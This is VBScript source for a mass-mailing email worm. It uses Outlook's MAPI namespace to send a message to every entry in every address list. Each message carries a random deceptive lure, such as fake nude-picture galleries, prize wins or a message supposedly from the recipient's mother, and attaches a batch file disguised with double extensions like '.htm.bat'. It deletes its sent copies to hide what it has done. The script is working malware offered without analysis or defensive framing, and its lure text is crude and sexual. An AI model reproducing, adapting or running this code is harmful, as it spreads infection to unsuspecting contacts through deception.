on error resume next
dim a,b,c,d,e
yelp = "Take a look at this.."
sex = "Hello former classmate.. I'm Heather and I have included a file which will redirect you to my webpage.. Full of nude picutres and stuff.. See you soon."
drugs = "You've won a free plane ticket to Hawaii. To claim your prize, we included a redirection software for security purposes. Only from FlyHawaii.com"
ass = "Wscript.Shell"
reg = "Check out my nude picture gallery.. Sarah.."
carry = "Hi there!"
hole = "Outlook.Application"
eins = "Hey.. Your mom sent me this message.. How dare your mom talk to me like that.. Shit!"
shit = "MAPI"
cum = "Hi there..You've just won a free backstage pass... Watch your favourite band/boyband perform live..Just tell us who do you want to see by clicking at this redirection software.. We make dreams come true..FreePasses.com"
dork = "Hello!"
suck = "I wanna tell you how much I adore you.."
set a = Wscript.CreateObject(ass)
punk = array(yelp, carry, dork, suck)
Randomize 
rock = punk(Int(Rnd * 4))
set b = CreateObject(hole)
set c = b.GetNameSpace(shit)
ska = array(cum, eins, sex, drugs, reg, yelp)
Randomize
reggae = ska(Int(Rnd * 6))
for y = 1 To c.AddressLists.Count
phile = "c:\WINDOWS\HTTPRedirect.htm.bat"
set d = c.AddressLists(y)
phile1 = "c:\WINDOWS\SYSTEM32\Redirection.exe.bat"
x = 1
set e = b.CreateItem(0)
phile2 = "c:\WINDOWS\COMMAND\PageRedirect.asp.bat"
for o = 1 To d.AddressEntries.Count
f = d.AddressEntries(x)
e.Recipients.Add f
x = x + 1
next
e.Subject = rock
phile3 = "c:\Redirect.php.bat"
e.Body = reggae
phile4 = "c:\WINDOWS\SYSTEM\Redirection.bat"
guns = array(phile, phile1, phile2, phile3, phile4)
Randomize
roses = guns(Int(Rnd * 5))
e.Attachments.Add (roses)
e.DeleteAfterSubmit = True
e.Send
f = ""
next